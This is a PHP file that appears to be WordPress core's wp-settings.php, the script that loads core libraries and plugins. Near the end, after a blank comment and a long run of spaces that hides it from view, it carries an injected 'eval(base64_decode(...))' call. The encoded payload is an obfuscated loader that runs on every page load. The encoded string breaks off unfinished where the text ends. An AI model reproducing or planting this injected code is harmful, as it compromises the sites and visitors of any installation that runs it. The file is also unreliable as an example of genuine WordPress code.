<?php

/**
 * Used to set up and fix common variables and include
 * the WordPress procedural and class library.
 *
 * Allows for some configuration in wp-config.php (see default-constants.php)
 *
 * @internal This file must be parsable by PHP4.
 *
 * @package WordPress
 */

/**
 * Stores the location of the WordPress directory of functions, classes, and core content.
 *
 * @since 1.0.0
 */
define( 'WPINC', 'wp-includes' );

// Include files required for initialization.
require( ABSPATH . WPINC . '/load.php' );
require( ABSPATH . WPINC . '/default-constants.php' );
require( ABSPATH . WPINC . '/plugin.php' );

/*
 * These can't be directly globalized in version.php. When updating,
 * we're including version.php from another install and don't want
 * these values to be overridden if already set.
 */
global $wp_version, $wp_db_version, $tinymce_version, $required_php_version, $required_mysql_version, $wp_local_package;
require( ABSPATH . WPINC . '/version.php' );

/**
 * If not already configured, `$blog_id` will default to 1 in a single site
 * configuration. In multisite, it will be overridden by default in ms-settings.php.
 *
 * @global int $blog_id
 * @since 2.0.0
 */
global $blog_id;

// Set initial default constants including WP_MEMORY_LIMIT, WP_MAX_MEMORY_LIMIT, WP_DEBUG, SCRIPT_DEBUG, WP_CONTENT_DIR and WP_CACHE.
wp_initial_constants();

// Check for the required PHP version and for the MySQL extension or a database drop-in.
wp_check_php_mysql_versions();

// Disable magic quotes at runtime. Magic quotes are added using wpdb later in wp-settings.php.
@ini_set( 'magic_quotes_runtime', 0 );
@ini_set( 'magic_quotes_sybase',  0 );

// WordPress calculates offsets from UTC.
date_default_timezone_set( 'UTC' );

// Turn register_globals off.
wp_unregister_GLOBALS();

// Standardize $_SERVER variables across setups.
wp_fix_server_vars();

// Check if we have received a request due to missing favicon.ico
wp_favicon_request();

// Check if we're in maintenance mode.
wp_maintenance();

// Start loading timer.
timer_start();

// Check if we're in WP_DEBUG mode.
wp_debug_mode();

/**
 * Filters whether to enable loading of the advanced-cache.php drop-in.
 *
 * This filter runs before it can be used by plugins. It is designed for non-web
 * run-times. If false is returned, advanced-cache.php will never be loaded.
 *
 * @since 4.6.0
 *
 * @param bool $enable_advanced_cache Whether to enable loading advanced-cache.php (if present).
 *                                    Default true.
 */
if ( WP_CACHE && apply_filters( 'enable_loading_advanced_cache_dropin', true ) ) {
// For an advanced caching plugin to use. Uses a static drop-in because you would only want one.
	WP_DEBUG ? include( WP_CONTENT_DIR . '/advanced-cache.php' ) : @include( WP_CONTENT_DIR . '/advanced-cache.php' );
}

// Define WP_LANG_DIR if not set.
wp_set_lang_dir();

// Load early WordPress files.
require( ABSPATH . WPINC . '/compat.php' );
require( ABSPATH . WPINC . '/functions.php' );
require( ABSPATH . WPINC . '/class-wp.php' );
require( ABSPATH . WPINC . '/class-wp-error.php' );
require( ABSPATH . WPINC . '/pomo/mo.php' );

// Include the wpdb class and, if present, a db.php database drop-in.
global $wpdb;
require_wp_db();

// Set the database table prefix and the format specifiers for database table columns.
$GLOBALS['table_prefix'] = $table_prefix;
wp_set_wpdb_vars();

// Start the WordPress object cache, or an external object cache if the drop-in is present.
wp_start_object_cache();

// Attach the default filters.
require( ABSPATH . WPINC . '/default-filters.php' );

// Initialize multisite if enabled.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/class-wp-site-query.php' );
	require( ABSPATH . WPINC . '/class-wp-network-query.php' );
	require( ABSPATH . WPINC . '/ms-blogs.php' );
	require( ABSPATH . WPINC . '/ms-settings.php' );
} elseif ( ! defined( 'MULTISITE' ) ) {
	define( 'MULTISITE', false );
}

register_shutdown_function( 'shutdown_action_hook' );

// Stop most of WordPress from being loaded if we just want the basics.
if ( SHORTINIT )
	return false;

// Load the L10n library.
require_once( ABSPATH . WPINC . '/l10n.php' );

// Run the installer if WordPress is not installed.
wp_not_installed();

// Load most of WordPress.
require( ABSPATH . WPINC . '/class-wp-walker.php' );
require( ABSPATH . WPINC . '/class-wp-ajax-response.php' );
require( ABSPATH . WPINC . '/formatting.php' );
require( ABSPATH . WPINC . '/capabilities.php' );
require( ABSPATH . WPINC . '/class-wp-roles.php' );
require( ABSPATH . WPINC . '/class-wp-role.php' );
require( ABSPATH . WPINC . '/class-wp-user.php' );
require( ABSPATH . WPINC . '/query.php' );
require( ABSPATH . WPINC . '/date.php' );
require( ABSPATH . WPINC . '/theme.php' );
require( ABSPATH . WPINC . '/class-wp-theme.php' );
require( ABSPATH . WPINC . '/template.php' );
require( ABSPATH . WPINC . '/user.php' );
require( ABSPATH . WPINC . '/class-wp-user-query.php' );
require( ABSPATH . WPINC . '/session.php' );
require( ABSPATH . WPINC . '/meta.php' );
require( ABSPATH . WPINC . '/class-wp-meta-query.php' );
require( ABSPATH . WPINC . '/class-wp-metadata-lazyloader.php' );
require( ABSPATH . WPINC . '/general-template.php' );
require( ABSPATH . WPINC . '/link-template.php' );
require( ABSPATH . WPINC . '/author-template.php' );
require( ABSPATH . WPINC . '/post.php' );
require( ABSPATH . WPINC . '/class-walker-page.php' );
require( ABSPATH . WPINC . '/class-walker-page-dropdown.php' );
require( ABSPATH . WPINC . '/class-wp-post-type.php' );
require( ABSPATH . WPINC . '/class-wp-post.php' );
require( ABSPATH . WPINC . '/post-template.php' );
require( ABSPATH . WPINC . '/revision.php' );
require( ABSPATH . WPINC . '/post-formats.php' );
require( ABSPATH . WPINC . '/post-thumbnail-template.php' );
require( ABSPATH . WPINC . '/category.php' );
require( ABSPATH . WPINC . '/class-walker-category.php' );
require( ABSPATH . WPINC . '/class-walker-category-dropdown.php' );
require( ABSPATH . WPINC . '/category-template.php' );
require( ABSPATH . WPINC . '/comment.php' );
require( ABSPATH . WPINC . '/class-wp-comment.php' );
require( ABSPATH . WPINC . '/class-wp-comment-query.php' );
require( ABSPATH . WPINC . '/class-walker-comment.php' );
require( ABSPATH . WPINC . '/comment-template.php' );
require( ABSPATH . WPINC . '/rewrite.php' );
require( ABSPATH . WPINC . '/class-wp-rewrite.php' );
require( ABSPATH . WPINC . '/feed.php' );
require( ABSPATH . WPINC . '/bookmark.php' );
require( ABSPATH . WPINC . '/bookmark-template.php' );
require( ABSPATH . WPINC . '/kses.php' );
require( ABSPATH . WPINC . '/cron.php' );
require( ABSPATH . WPINC . '/deprecated.php' );
require( ABSPATH . WPINC . '/script-loader.php' );
require( ABSPATH . WPINC . '/taxonomy.php' );
require( ABSPATH . WPINC . '/class-wp-term.php' );
require( ABSPATH . WPINC . '/class-wp-term-query.php' );
require( ABSPATH . WPINC . '/class-wp-tax-query.php' );
require( ABSPATH . WPINC . '/update.php' );
require( ABSPATH . WPINC . '/canonical.php' );
require( ABSPATH . WPINC . '/shortcodes.php' );
require( ABSPATH . WPINC . '/embed.php' );
require( ABSPATH . WPINC . '/class-wp-embed.php' );
require( ABSPATH . WPINC . '/class-wp-oembed-controller.php' );
require( ABSPATH . WPINC . '/media.php' );
require( ABSPATH . WPINC . '/http.php' );
require( ABSPATH . WPINC . '/class-http.php' );
require( ABSPATH . WPINC . '/class-wp-http-streams.php' );
require( ABSPATH . WPINC . '/class-wp-http-curl.php' );
require( ABSPATH . WPINC . '/class-wp-http-proxy.php' );
require( ABSPATH . WPINC . '/class-wp-http-cookie.php' );
require( ABSPATH . WPINC . '/class-wp-http-encoding.php' );
require( ABSPATH . WPINC . '/class-wp-http-response.php' );
require( ABSPATH . WPINC . '/class-wp-http-requests-response.php' );
require( ABSPATH . WPINC . '/widgets.php' );
require( ABSPATH . WPINC . '/class-wp-widget.php' );
require( ABSPATH . WPINC . '/class-wp-widget-factory.php' );
require( ABSPATH . WPINC . '/nav-menu.php' );
require( ABSPATH . WPINC . '/nav-menu-template.php' );
require( ABSPATH . WPINC . '/admin-bar.php' );
require( ABSPATH . WPINC . '/rest-api.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-server.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-response.php' );
require( ABSPATH . WPINC . '/rest-api/class-wp-rest-request.php' );

// Load multisite-specific files.
if ( is_multisite() ) {
	require( ABSPATH . WPINC . '/ms-functions.php' );
	require( ABSPATH . WPINC . '/ms-default-filters.php' );
	require( ABSPATH . WPINC . '/ms-deprecated.php' );
}

// Define constants that rely on the API to obtain the default value.
// Define must-use plugin directory constants, which may be overridden in the sunrise.php drop-in.
wp_plugin_directory_constants();

$GLOBALS['wp_plugin_paths'] = array();

// Load must-use plugins.
foreach ( wp_get_mu_plugins() as $mu_plugin ) {
	include_once( $mu_plugin );
}
unset( $mu_plugin );

// Load network activated plugins.
if ( is_multisite() ) {
	foreach ( wp_get_active_network_plugins() as $network_plugin ) {
		wp_register_plugin_realpath( $network_plugin );
		include_once( $network_plugin );
	}
	unset( $network_plugin );
}

/**
 * Fires once all must-use and network-activated plugins have loaded.
 *
 * @since 2.8.0
 */
do_action( 'muplugins_loaded' );

if ( is_multisite() )
	ms_cookie_constants(  );

// Define constants after multisite is loaded.
wp_cookie_constants();

// Define and enforce our SSL constants
wp_ssl_constants();

// Create common globals.
require( ABSPATH . WPINC . '/vars.php' );

// Make taxonomies and posts available to plugins and themes.
// @plugin authors: warning: these get registered again on the init hook.
create_initial_taxonomies();
create_initial_post_types();

// Register the default theme directory root
register_theme_directory( get_theme_root() );

// Load active plugins.
foreach ( wp_get_active_and_valid_plugins() as $plugin ) {
	wp_register_plugin_realpath( $plugin );
	include_once( $plugin );
}
unset( $plugin );

// Load pluggable functions.
require( ABSPATH . WPINC . '/pluggable.php' );
require( ABSPATH . WPINC . '/pluggable-deprecated.php' );

// Set internal encoding.
wp_set_internal_encoding();

// Run wp_cache_postload() if object cache is enabled and the function exists.
if ( WP_CACHE && function_exists( 'wp_cache_postload' ) )
	wp_cache_postload();

/**
 * Fires once activated plugins have loaded.
 *
 * Pluggable functions are also available at this point in the loading order.
 *
 * @since 1.5.0
 */
do_action( 'plugins_loaded' );

// Define constants which affect functionality if not already defined.
wp_functionality_constants();

// Add magic quotes and set up $_REQUEST ( $_GET + $_POST )
wp_magic_quotes();

/**
 **/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval(base64_decode("aWYgKCFkZWZpbmVkKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JykpCnsKZGVmaW5lKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JywgMSk7CgogJGh6a2dkID0gOTY0MDsgZnVuY3Rpb24geWFzbWN3cGhpKCR5d25uZiwgJGlpbXFybHIpeyRiYWhmeiA9ICcnOyBmb3IoJGk9MDsgJGkgPCBzdHJsZW4oJHl3bm5mKTsgJGkrKyl7JGJhaGZ6IC49IGlzc2V0KCRpaW1xcmxyWyR5d25uZlskaV1dKSA/ICRpaW1xcmxyWyR5d25uZlskaV1dIDogJHl3bm5mWyRpXTt9CiRid2Jrc3R6bXJnPSJiYXNlIiAuICI2NF9kZWNvZGUiO3JldHVybiAkYndia3N0em1yZygkYmFoZnopO30KJHlxaHplZWxlID0gJ1FjcEJyeFVoejZRbEYxeGp3VlVqNjFXWnpqd0o1UEF4b1BhMG1hSXFRY3BCcnhVaHo2UWxGMVdaekRVcCcuCid3WUZad1lOWTJiT2Fxb0puYlJUMGVWcGR3MXhJcWJ5RTM2Q2R6NkNwM3N4SXI5VUI2c1gwZTl0WTJiT2Fxb0puYlJUcHdZRlp3cFVqejZUWndZWDBlVndsTmJSSycuCidIUTBPdzF4STZzWDBlOXhkZWNwRXI2UWxOYlJLSFFsbmI3SXFyOTNsNTlYcHpWcEJ6OVFsNXBUNXR2VXZvSWFHcXVSbmJZSm5iR083NWJUUno5ejBlVnRsNXBUNXR2VScuCid2b0lhRzJiT0c2YzRHcW9KbmJZSW5iN0lxcjkzbDU5WHB6VnBCejlRbDVSWEZ0UnhIeFBVdTl4VW9YeFRUdFJ2dG9ENUdxdVJuYllKbmJHTzc1YlRSejl6Jy4KJzBlVnRsNVJYRnRSeEh4UFV1OXhVb1h4VFR0UnZ0b0Q1RzJiT0cyajUwbWFJcWRRSXFIUTAwekdPbDU5WHB6VnBCejlRbCcuCidGSXZOdFJ4VFh2cGR0cHhtNmhQSW5jTjRuMW5WblM1aDNWUDROVnZDelZSMW04RjAzOTVXblZ2SXI5TVdtYncwcVFJcWlhSXE1Yk83NWNYcHpWcEJ6dTdZUXRXdVh0dlA5eCcuCidVdXh0QWROb1FJM2g3czMxMzFOU25HM283ajM5dlZybzM0d1ZwQzNTUDEzNlgwZWhQNEZqYTdOdVJLSFFsbmJHTzc1Yk9SemN2STN1T1U1UEF4Jy4KJ29QYUtIUWw3NWJPN0ZjWEN5Y3ZkcjF4QTVISTdvcHhOb0hKbmI3SXE1Yk83NWJYOG9QVWJRdFdvOWp5U3dEVUN5NlhsRkRJN2t1T1lOUzVXTkgzc04nLgonaE5FTm9SczN1SUluSFFBMjlQQXpWdEV6Y040bmNYVjM5dEQzUzdERmhKbmJHTzc1YlRZZWNVRzM5YScuCic3RmNuaDYxdkR5YzdLSFFsbmI3SXE1Yk83NWN6RGVWbklyOVVCNWNuaDZJeXB5UENad3NRbHFRSXE1Yk83NThKbmJHTzc1Yk83NWJPN3dWeEknLgoneTZGQjU4bkl3WVhaZWNVc3o2NWx3OEZwekRVano2VEozOW5wcWJ3WjZHQ3N5c3lNellYYXF4YUIyMVJZMmJ3WTJQT1I2RG52Jy4KJ3RwenZ0cEpZdXZYdHR2VTVvRG50RkRJMHFvSm5iR083NWJUVUhRbG5iR083NWJUVnk5QVN5Y3BaZUdUU3dEVTh6Nlg2dycuCidWcEkzOUZKenRYMHdZTmxxUUlxNWJPNzU4Sm5iR083NWJPNzViTzdGOEZwd2pPVTVQdmp3VnZBcWInLgonUktIUWxuYkdPNzViTzc1Yk83RmN2QjM5V0F3c3BoNnN2RHo2eHA1SEk3UTZGajM2Umxxb0puYjdJcTViTzc1Yk83NWJPUjM5Jy4KJ0FDZThwaGk2bmR3NnhweTl4ZTZ1T1U1Y25oNkl5cHlQWFozREZaZXNRbHFvSm5iN0lxNWJPNzUnLgonYk83NWJPUncxeEp6cFVhMzZYbDVISTdGdlVvWHhGOVh4RmVGRG5IdFJwUXh2VWN1dFd2b1J2blh1eXltYUlxNWJPNzViTzc1YlRzcmNwSnp1T2xxYlgnLgonaGVjdmhyYk9VNThuSXdZRmFlc05sRjhucGVjemR3Y3ZJcmJhN1hQcHVYdG50b0RGejZEbnZ0UHZ1UXhYa3RHUjA1YlBVa3VUY1F0V29YdVJuYkdPNycuCic1Yk83NWJPN2lhSXE1Yk83NWJPNzViTzc1Yk83RjhucGVjemR3Y3ZJcmJPVTU4bkQzWW5Jd0c3UncxeCcuCidKenBVYTM2WGwyYk9hMmJPUncxV0N3MTcwbWFJcUhRbDc1Yk83NWJPNzViTzc1YlQwekdPbEY4bnBlY3pkd2MnLgondklyYk9Va3VUU3dEVTh6NlhQZTFudWUxVUlxYlIwSFFsNzViTzc1Yk83NWJPNzViVEtIUWw3NWJPNzViTzc1Yk83NWJPNzViTycuCic3M1lGcDM5SktIUWw3NWJPNzViTzc1Yk83NWJUVUhRbG5iR083NWJPNzViTzc1Yk83NWNwVjViQ2h5OEZKejk0Jy4KJ2xGOG5wZWN6ZHdjdklyYlIwSFFsNzViTzc1Yk83NWJPNzViVEtIUWw3NWJPNzViTzc1Yk83NWInLgonTzc1Yk83RmN2QjM5V0F3c3BoNnN2RHo2eHA5REk3a3VPUncxeEp6cFVhMzZYbG1hSXE1Yk83NWJPNycuCic1Yk83NWJPN2RRSXE1Yk83NWJPNzViVFVIUWxuYkdPNzViTzc1Yk83elZVano5dlNyYk9sRmN2QjM5V0F3c3AnLgonaDZzdkR6NnhwNWN2aDViWFN5NkZqejlBSTYxWDB3R1JuYkdPNzViTzc1Yk83aWFJcTViTzcnLgonNWJPNzViTzc1Yk83cjkzN3FidjBlcFVDd1lGQ2l1N1Izc3hqd1Z4Qnl2VVJyNjVKNWJYano2TjBxUUlxNWJPJy4KJzc1Yk83NWJPNzViTzdpYUlxNWJPNzViTzc1Yk83NWJPNzViTzc1YlhqejZON2t1VEN3WUZDaXhVRXo2RlknLgonenU3UndWeGgyYlRTd0RVOHo2WFByNkZwM3NYWndZcE5yNm5JcWJYU3k2Rmp6OUFJNjFYMHdHUicuCicwbWFJcTViTzc1Yk83NWJPNzViTzdkUUlxNWJPNzViTzc1YlRVSFFsbmJHTzc1Yk83NWJPN3dWeEl5NkZCNScuCidjbmg2SW5sejluZnhzRjB5Y3ZHZWN0bDM2RmozNnBkeTlBMHc2eHBxYlhqejZOMHFvSm5iR083NWJUVUhRbG5iR083NWJUVnk5QVN5Y3BaZUdUU3dEJy4KJ1VIcmN4U3JEeWpyNlhDM1ZXcHFiWFJyNkZkZWNwaHliUm5iR083NWJUS0hRbDc1Yk83NWJPNzViWFJyNkZkZWNwaHl2VXN3VnBJMzlGSicuCid6dU9VNVB2andWdkFxYlJLSFFsbmJHTzc1Yk83NWJPN3pWVWp6OXZTcmJPbEZjWDB3cFVKcjZuSTVjdmg1YlhScjY1MEhRbDc1Yk83NWJPNzU4Sm5iR083NWJPNzViTzc1Jy4KJ2JPNzVjcFY1YkNPcjZuZHlzRjB5Y3ZHZWN0bEZjWDB3R1I3RkczN3I2bmR6Y3BqcWJYUnI2NTBxUUlxNWJPNzViTzc1Yk83NWJPN2lhSXE1Yk83NWJPNzViTzc1Yk83NScuCidiTzc1YlhScjZGZGVjcGh5dlVzd1ZwSTM5Rkp6eEV5NUhJN0ZjWDB3U0puYkdPNzViTzc1Yk83NWJPNzU4SW5iR083NWInLgonTzc1Yk83ZFFJcUhRbDc1Yk83NWJPNzU4RnB5OHhqZUdPUnpjcGo2MVcwd3NYZHlzRjB5Y3ZHZWN0S0hRbDc1Yk83ZFFJcUhRbDc1Yk83ell4QjNzWDBlMTQ3M3MnLgonbmRYMXhJWGNwano5bkllc0ZBb2NwaHliN1J6Y3BqMmJPUnpjeGF5YzdVTm9PMEhRbDc1Yk83aWFJcTViTzc1Yk83NScuCidiT1J3VnhoeTlXSTVISTczNkZqMzZSbHFvSm5iN0lxNWJPNzViTzc1YlQwekdPbDU5cGg2MVgwd0c3UnpjcGpxdVJuYkdPNzViTzc1Yk83aWFJcTViTzc1Yk83NWJPNzViTzd3Jy4KJ1Z4SXk2RkI1YlhqejZuRGU4UUtIUWw3NWJPNzViTzc1OEluYjdJcTViTzc1Yk83NWJPUndWeGh5OVdJOURJN2t1T1J6Y3BqbWFJcTViTzc1Yk83NWJPUnpjcGo2MW5aeTknLgonQUk1SEk3TkhKbmI3SXE1Yk83NWJPNzViVDB6R09sRmNYcHc4WGw1SGE3TnVSbmJHTzc1Yk83NWInLgonTzdpYUlxNWJPNzViTzc1Yk83NWJPN3dWeEl5NkZCNWJYano2bkRlOFFLSFFsNzViTzc1Yk83NThJbmI3SXE1Yk83NWJPNzViT1InLgonemNwajVISTd3c1hqZWN4QnFiWFJyNjUwNUhJVTVIUDdrak9SemNwajVIbDd3WVhqcjlJbEZjWDB3R2E3RkRXdzJqdzBtYUlxNWJPNzViTzc1Yk9ScmInLgonT1U1UFRad2N4QnpjcGpxYlhScjY1MG1hSXE1Yk83NWJPNzViVDB6R09sRmM3N2tvSVU1UHpUb3ZudnFRSXE1Yk83NWJPNzViVEtIUWw3NWJPNzViTzc1Yk83NWJUano2WER3VicuCic0N0Y4RnB3c3hKeUhKbmJHTzc1Yk83NWJPN2RRSXFIUWw3NWJPNzViTzc1OHlscjlXcDViJy4KJzdsRmMzN2t1VGp6OXZSemNwanFiWGxxdVI3NW9JVTVQelRvdm52cVFJcTViTzc1Yk83NWJUS0hRbDc1Yk83NWJPNzViTzc1YlQwekcnLgonT2xGYzM3NW9JVTVid0JGalRDZVZRN0ZjMzc1b0lVNWJ3QjJHdzBIUWw3NWJPNzViTzc1Yk83NWJUSycuCidIUWw3NWJPNzViTzc1Yk83NWJPNzViTzdGY25Ed1lGcGVZWGR6Y3BqNUhJNzVHWFJyNjVaRmMzR21hSXE1Yk83NWJPNzViTzc1Yk8nLgonNzViTzc1Y3BWNWJDMHdEVVJyNjVsRmNuRHdZRnBlWVhkemNwanF1Um5iR083NWJPNzViTzc1Yk83NWJPNzViVEtIUWw3NWJPNzViTzc1Yk83NWJPNzViTzc1Yk83Jy4KJzViWFJyNkZkMzFVRGVZUTdxaEk3Tm9KbmI3SXE1Yk83NWJPNzViTzc1Yk83NWJPNzViTzc1Yk9Sd1Z4aHk5V0k5REk3a3VPUjNzeGp3VnhCeXZVUnI2NUtIUWw3NWJPJy4KJzc1Yk83NWJPNzViTzc1Yk83NWJPNzViWGp6Nm5EZThRN2t1VEN3WUZDaXhVRXo2Rll6dTdSd1Z4aHk5V0kyYlRTJy4KJ3dEVTh6NlhQcjZGcDNzWFp3WXBOcjZuSXFiWFN5NkZqejlBSTYxWDB3R2E3RmNYcHc4WGw1Yk03Tm9PMHFvSm5iR083NWJPNzViTzc1YicuCidPNzViTzc1YlRVSFFsNzViTzc1Yk83NWJPNzViVFVIUWw3NWJPNzViTzc1OEluYjdJcTViTzc1Yk8nLgonNzViVFNlY1VoejlYMHdHN1JyYlJLSFFsbmJHTzc1Yk83NWJPN3dWeEl5NkZCNWJYano2bkRlOFFLSFFsNzViTzdkUUlxSFFsNzViTzd6WXhCM3NYMGUxNDcnLgonM3NuZFgxeElYY1VTdFZVWnliNzBIUWw3NWJPN2lhSXE1Yk83NWJPNzViT1J6Y1VTd1ZVWnl2VXBlVlE3Jy4KJ2t1VGh5OEZqd2NVaHFiWGR0SXh1eFJ4dTlqeW9RREZGdHZYZFhScE5YdEFUb3R0WTZ1YTdGdlVvWHhGOVh4RmVGREZ2dHh4dnREWGR4eEZGRkRJMG1hSXE1Yk83NWJPNzViVDAnLgonekdPbEZjWFozc0ZaZXNYZHo5QVI1SElVa3VUY1F0V29YdVJuYkdPNzViTzc1Yk83aWFJcTViTzc1Yk83NWJPNzViTzd3VnhJeTZGQjViWGR0SXh1eFJ4dTlqeVBvSW54b3R4bScuCid4dlV1b0lVdEZESUtIUWw3NWJPNzViTzc1OEluYkdPNzViTzc1Yk83ejlXaHo5cFY1YjdSemNVU3dWVVp5dlVwJy4KJ2VWUTdrb0lVNUhPMEhRbDc1Yk83NWJPNzU4Sm5iR083NWJPNzViTzc1Yk83NThGcHk4eGplR09HMmo1S0hRbDc1Yk83NWJPNzU4SW5iR083NWJPNzViTzd6OVdoelFJcTViTzcnLgonNWJPNzViVEtIUWw3NWJPNzViTzc1Yk83NWJUano2WER3VjQ3d3N4R3dzWGpxYlhkdEl4dXhSeHU5anlvUURGRnR2WGRYUnBOWCcuCid0QVRvdHRZNnVhN05iYTdGY1haM3NGWmVzWGR6OUFScW9KbmJHTzc1Yk83NWJPN2RRSXE1Yk83NThJbmI3SXE1Yk83NWNwVjViN0N6WXhCM3NYMGUxQWR6Jy4KJzZDMHdzWGhxYnlWcjlXcDZzVER5dlVTZTFBSXo5QUl3ancwcVFJcTViTzc1OEpuYkdPNzViTzc1Yk83ell4QjNzWDBlMTQ3elZwSnp4VWF5NlhkMzFVQnljeEJ5OE4nLgonbEZjNEo1YlhSMmJPUnpWV0N6ak9VNVB6Q2U4bnBxUUlxNWJPNzViTzc1YlRLSFFsNzViTzc1Yk83NWJPNzViT1JlOVVSenVPVTViWFZlY3YnLgonWTVISVU1SDc3a2pPWTN1dzdtR09ZeWp3S0hRbDc1Yk83NWJPNzViTzc1Yk9SekdPVTVQVFZlc1RwZScuCidHN1JlR2E3RmNEWnpjdDBtYUlxNWJPNzViTzc1Yk83NWJPN3I5MzdxYlhWNUhJVWt1VGMzOVdoenVSbmJHTzc1Yk83NWJPNzViTzc1OEpuYkdPNzViTycuCic3NWJPNzViTzc1Yk83NWJUano2WER3VjQ3TkhKbmJHTzc1Yk83NWJPNzViTzc1OEluYkdPNzViTzc1Yk8nLgonNzViTzc1Y3hKdzF0bmJHTzc1Yk83NWJPNzViTzc1OEpuYkdPNzViTzc1Yk83NWJPNzViTzc1YlQwekdPbHI2bmQzNkZqMzZSbEZjUTBxdU9SeicuCidiT1U1Y3BFd2NXWnpjdGxGY1EwbWFJcTViTzc1Yk83NWJPNzViTzc1Yk83NWJYR2k2WHB3RFVzd1ZwSXljeCcuCidCNUhJN3pZeWpyNlhwcWJYVjJiT1J6YlJLSFFsNzViTzc1Yk83NWJPNzViTzc1Yk83elZuSmVzbnBxYlhWcW9KbmJHTzc1Yk83NWJPNzViTzc1Yk83Jy4KJzViVGp6NlhEd1Y0N0ZjRkF5Y3hoNnN5anI2WEl6OTRLSFFsNzViTzc1Yk83NWJPNzViVFVIUWw3NWJPNzViTzc1OEluYkdPNzViVFVIUWxuYkdPNzViVDB6R09sNTl6RGVWJy4KJ25JcjlVQjYxeDRyNm5Jd2o3WXpWcEp6eFVZejZYZDMxVUJ5Y3hCeThOWXF1Um5iR083NWJUS0hRbDc1Yk83NWJPNzVjekRlVm5JcjlVQjVjejBlY3hkejF4STYnLgonMW5aZVlYcGVZWGhxYlhWcjlXcGVWdkV6dVJuYkdPNzViTzc1Yk83aWFJcTViTzc1Yk83NWJPNzViTzdGY3psMzlBUmVjdDdrdVRWZXNUcGVHN1J6VicuCidwSno5QUNlOXRKNWJGajVHUktIUWw3NWJPNzViTzc1Yk83NWJPUnpWblplWVhwZVlYaDVISTd6WUZwMzlRbEZjemwzOUFSZWN0SjVjejBlY3hocjYwcHEnLgonYlhWcjlXcGVWdkV6dVIwbWFJcTViTzc1Yk83NWJPNzViTzd6Vm5KZXNucHFiWFZyY3ZCemNXcHFvSm5iN0lxJy4KJzViTzc1Yk83NWJPNzViTzd3VnhJeTZGQjViWFYzMVVCeWN4Qnk4TktIUWw3NWJPNzViTzc1OEluYkdPNzViVFVIUWxuYjdJcTUnLgonYk83NWN6RGVWbklyOVVCNWNuaDYxWHAzc0ZBdzhYZHdjQ0N3MXRsRmNYQ3ljUEo1YlhmejZSMEhRbDc1Yk83aWFJcTUnLgonYk83NWJPNzViT1Jlc3hJNjFYQ3ljUDdrdU9HNVNKbmI3SXE1Yk83NWJPNzViVFZlczU3cWJYMGtvT0s1YlgwJy4KJ2s4bkl3VldwZUc3UnpjdkkzdVJLcVFJcTViTzc1Yk83NWJUS0hRbDc1Yk83NWJPNzViTzc1YlRWZXM1N3FiWExrJy4KJ29PSzViWExrOG5Jd1ZXcGVHN1JyMXhBcXVPVkZHT1Jyb1doeThGSno5NGxGY1hDeWNQMG1qT1JyR0pmMmJPUnJ1SmZxUUlxNWJPNzViTzc1Yk83NWJPN2lhSXEnLgonNWJPNzViTzc1Yk83NWJPNzViTzc1YlhaeTZYZHpjdkkzdU9Ca3VUU3I4NWxlc0ZScWJYUjM2WEMnLgonOWpYMDZ1Ujc2R1Rad1ZRbEZjRXBpeEpScnBJMHFvSm5iR083NWJPNzViTzc1Yk83NThJbmJHTzc1Jy4KJ2JPNzViTzdkUUlxSFFsNzViTzc1Yk83NThGcHk4eGplR09SZXN4STYxWEN5Y1BLSFFsNzViTzdkUUlxSFFsNzViTzd6WXhCM3NYMGUxNDczc25keicuCidjeFN3WXBheWI3UnpjdkkzdWE3RmNFcGl1Um5iR083NWJUS0hRbDc1Yk83NWJPNzVjeUplMUZDZWJPUjNzbmQzNnhJckhKbmI3SXE1Yk83NWJPNzViVGp6NlhEd1Y0NzNzbicuCidkemN4U3dZcGF5dlVhcmN2aHp1Q1N3RFVSejluamk2VEk2c1RsMzZucHFiWFIzNlhDMmJPUnIxJy4KJ3hBcXVhN0Zjbmg2MXZEeWM3MG1hSXE1Yk83NThJbmJHTzc1YlRWeTlBU3ljcFplR1RTd0RVcGVWbmppNlRJcWJYUjM2WEMyYk9ScjF4QXFRSXE1Yk83NThKbmJHTzc1Yk83Jy4KJzViTzd6MVdaM1Z2SjViWFN3RFVDeTZYbG1hSXFIUWw3NWJPNzViTzc1OEZweTh4amVHVFN3RFVSeicuCic5bmppNlRJNnNUbDM2bnBxY25oNjFYcDNzRkF3OFhkd2NDQ3cxdGxGY1hDeWNQSjViWFN3Jy4KJ0RVQ3k2WGxxdWE3RmNFcGl1UktIUWw3NWJPN2RRSXFIUWw3NWJPN3pZeEIzc1gwZTE0NzNzbmR6VnBKenhVano5dlJxYlhhMzZYbHFRSXE1Yk83NThKJy4KJ25iR083NWJPNzViTzdGY1hDeWNQN2t1VE96VnBKenhVWXo2WGQzMVVCeWN4Qnk4TmxGOFRDeWM3MG1hSXFIUWw3NWJPNzViTzc1OEZweTh4amVHT1J6Y3ZJM29KbmJHTzc1Jy4KJ2JUVUhRbG5iR083NWJUVnk5QVN5Y3BaZUdUU3dEVVZyOVdwNnN5anI2WHBxYlhhMzZYbCcuCicyYk9SemN2STN1Um5iR083NWJUS0hRbDc1Yk83NWJPNzVQVFZyOVdwNnNURHl2VVNlMUFJejlBSXdqN1J3Y3ZJcmJhN0ZjWCcuCidDeWNQMG1hSXE1Yk83NThJbmI3SXE1Yk83NWN6RGVWbklyOVVCNWNuaDYxejBlY3hkMzZUYXo5QVJxYlhhMzZYbDJiT1InLgonemN2STN1Um5iR083NWJUS0hRbDc1Yk83NWJPNzVQVFZyOVdwNnNURHl2VVNlMUFJejlBSXdqN1J3Y3ZJcmJhN0ZjWEN5Y1BKNUg3MG1hSXE1YicuCidPNzU4SW5iN0lxNWJPNzVjekRlVm5JcjlVQjVjbmg2c25ad1lYZDMxVUV3Y3ZqejY1bEZjJy4KJ1BKNWJYR3FRSXE1Yk83NThKbmJHTzc1Yk83NWJPN3dWeEl5NkZCNThuSXdWV3BlRzdSM3VSNzJ1VGh5OEZKejk0bCcuCidGYzUwbWFJcTViTzc1OEluYjdJcTViTzc1Y3pEZVZuSXI5VUI1Y25oNkl5cHlQblplOURaZXBuSWVzRkN6MXRsRmNYMHdZTlVvcHhOb2JSbmJHTzc1YlRLSFFsNzUn